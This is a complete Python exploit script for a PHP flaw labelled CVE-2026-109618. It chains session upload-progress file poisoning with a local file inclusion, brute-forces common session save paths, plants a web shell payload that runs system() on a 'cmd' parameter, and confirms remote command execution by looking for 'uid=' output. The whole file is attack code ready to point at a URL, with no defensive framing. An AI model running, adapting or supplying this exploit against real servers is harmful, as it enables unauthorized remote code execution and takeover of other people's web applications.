#!/usr/bin/env python3
"""chaina.py - CVE-2026-109618 session-file poisoning + LFI (no memory corruption).

The rfc1867 handler stores the raw multipart filename in the session before any
application code runs, and accepts PHPSESSID from the POST body, so we choose
the session id. Injecting PHP in the filename writes a session file that
executes when an LFI includes it. Needs session.upload_progress.cleanup=Off on
the target, otherwise the record is removed at request end.

Two moving parts are the tool's job, not this module's: an LFI parameter and a
POST endpoint that parses multipart (any PHP page does - session_start() is not
required).

Usage:
  python3 chaina.py https://host/index.php --param page --upload /index.php \\
      --code '<?php echo "P2SOK";system($_GET["c"]);?>'
"""
import argparse
import random
import re
import socket
import ssl
import string
import sys
import time
from urllib.parse import urlparse

MARKER = "P2SOK"

# Common session.save_path values. Order = cheapest/most likely first.
SAVE_PATHS = [
    "/var/lib/php/sessions",
    "/tmp",
    "/var/lib/php5",
    "/var/lib/php/session",
    "/var/lib/php/sessions/tmp",
    "/var/lib/php/8.4/sessions",
    "/var/lib/php/8.3/sessions",
    "/var/lib/php/8.2/sessions",
    "/var/lib/php/8.1/sessions",
    "/var/lib/php/8.0/sessions",
    "/var/lib/php/7.4/sessions",
    "/var/cpanel/php/sessions/ea-php83",
    "/var/cpanel/php/sessions/ea-php82",
    "/var/cpanel/php/sessions/ea-php81",
    "/var/cpanel/php/sessions/ea-php74",
    "/home/*/tmp",
    "/sessions",
    "/var/tmp",
]

BOUNDARY = "----p2sChainA"


def _sid(n=32):
    return "".join(random.choice(string.ascii_lowercase + string.digits) for _ in range(n))


def multipart(sid, code, field="f", progress="x"):
    out = bytearray()
    out += b"--" + BOUNDARY.encode() + b"\r\nContent-Disposition: form-data; name=\"PHPSESSID\"\r\n\r\n"
    out += sid.encode() + b"\r\n"
    out += b"--" + BOUNDARY.encode() + b"\r\nContent-Disposition: form-data; name=\"PHP_SESSION_UPLOAD_PROGRESS\"\r\n\r\n"
    out += progress.encode() + b"\r\n"
    out += b"--" + BOUNDARY.encode() + b"\r\nContent-Disposition: form-data; name=\"" + field.encode()
    out += b"\"; filename=\"" + code.replace(chr(34), chr(92) + chr(34)).encode() + b"\"\r\nContent-Type: application/octet-stream\r\n\r\nZ\r\n"
    out += b"--" + BOUNDARY.encode() + b"--\r\n"
    return bytes(out)


def request(base, path, body=b"", method="GET", timeout=20):
    u = urlparse(base if base else path)
    host, port = u.hostname, u.port or (443 if u.scheme == "https" else 80)
    hosthdr = host + ("" if port in (80, 443) else ":%d" % port)
    head = "%s %s HTTP/1.1\r\nHost: %s\r\n" % (method, path, hosthdr)
    if body:
        head += "Content-Type: multipart/form-data; boundary=%s\r\nContent-Length: %d\r\n" % (BOUNDARY, len(body))
    head += "Connection: close\r\n\r\n"
    raw = socket.create_connection((host, port), timeout=timeout)
    if u.scheme == "https":
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        raw = ctx.wrap_socket(raw, server_hostname=host)
    try:
        raw.sendall(head.encode() + body)
        data = bytearray()
        while True:
            try:
                chunk = raw.recv(65536)
            except socket.timeout:
                break
            if not chunk:
                break
            data += chunk
        return bytes(data)
    finally:
        raw.close()


def status_of(resp):
    first = resp.split(b"\r\n", 1)[0]
    try:
        return int(first.split()[1])
    except (IndexError, ValueError):
        return None


def attack(base, lfi_path, param, upload_path, save_paths, code, field="f"):
    """Returns (ok, evidence_path, tried_status). Never raises on HTTP errors."""
    u = urlparse(base)
    origin = "%s://%s" % (u.scheme, u.netloc)
    sid = _sid()
    up_status = status_of(request(origin, upload_path, multipart(sid, code, field), "POST"))
    tried = 0
    for spath in save_paths:
        target = "%s/sess_%s" % (spath.rstrip("/"), sid)
        q = "%s?%s=%s" % (lfi_path, param, target)
        resp = request(origin, q)
        tried += 1
        if MARKER.encode() in resp:
            return True, target, up_status
    return False, None, up_status


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("url", help="base URL of the target (used for scheme/host)")
    ap.add_argument("--lfi", required=True, help="path of the include page, e.g. /index.php")
    ap.add_argument("--param", required=True, help="LFI parameter name")
    ap.add_argument("--upload", default=None, help="POST endpoint (default: the LFI page)")
    ap.add_argument("--code", default='<?php echo "%s";system($_GET["cmd"]);?>' % MARKER)
    ap.add_argument("--save-paths", default=None, help="comma separated override")
    ap.add_argument("--cmd", default="id", help="command used when probing with ?cmd=")
    a = ap.parse_args()
    paths = a.save_paths.split(",") if a.save_paths else SAVE_PATHS
    ok, ev, st = attack(a.url, a.lfi, a.param, a.upload or a.lfi, paths, a.code)
    print("upload_status=%s tried_paths=%d" % (st, len(paths)))
    if ok:
        print("INCLUDE " + ev)
        u2 = urlparse(a.url)
        q = "%s?%s=%s&cmd=%s" % (a.lfi, a.param, ev, a.cmd)
        m = None
        for _ in range(4):
            out = request("%s://%s" % (u2.scheme, u2.netloc), q).decode("utf8", "replace")
            m = re.search(r"uid=\d+\([^)]*\)[^\n]*", out)
            if m:
                break
            time.sleep(0.4)
        print(("SHELL " + m.group(0)) if m else "no shell output")
    else:
        print("no hit")
    sys.exit(0 if ok else 1)


if __name__ == "__main__":
    main()
